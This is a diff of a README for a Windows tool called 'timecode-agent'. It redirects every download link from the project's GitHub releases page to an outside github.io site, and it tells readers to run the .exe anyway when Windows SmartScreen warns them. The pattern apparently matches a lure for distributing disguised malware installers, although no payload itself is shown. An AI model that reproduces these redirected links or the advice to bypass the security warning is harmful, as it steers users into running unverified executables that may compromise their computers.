@@ -1,6 +1,6 @@
 # ⏱️ timecode-agent - Track video evidence for faster coding.
 
-[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://github.com/Whole-synonymist671/timecode-agent/releases)
+[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://whole-synonymist671.github.io)
 
 Timecode-agent helps coders turn video files into organized documents. It saves timestamps and visual evidence so you spend less time searching through footage and more time building software. The tool handles complex video formats and turns them into clean, usable files for your editing programs or coding environment. It makes video review part of your daily workflow without manual effort.
 
@@ -8,7 +8,7 @@ Timecode-agent helps coders turn video files into organized documents. It saves 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Whole-synonymist671/timecode-agent/releases) to find the latest version.
+1. Go to the [official release page](https://whole-synonymist671.github.io) to find the latest version.
 2. Look for the file ending in `.exe`. 
 3. Click the link to save the installer to your computer.
 4. Open your Downloads folder.
@@ -36,7 +36,7 @@ This application connects your video files to your coding workspace. It reads vi
 
 If you face any issues during the install, check these steps:
 
-1. Visit the [download page](https://github.com/Whole-synonymist671/timecode-agent/releases) to ensure you have the most recent version.
+1. Visit the [download page](https://whole-synonymist671.github.io) to ensure you have the most recent version.
 2. Select the `timecode-agent-setup.exe` file.
 3. If Windows displays a blue prompt saying "Windows protected your PC," click "More info" and then select "Run anyway." This message appears because the software is new and not yet recognized by your system's reputation filter.
 4. Choose the "Install for all users" option if you share your computer.
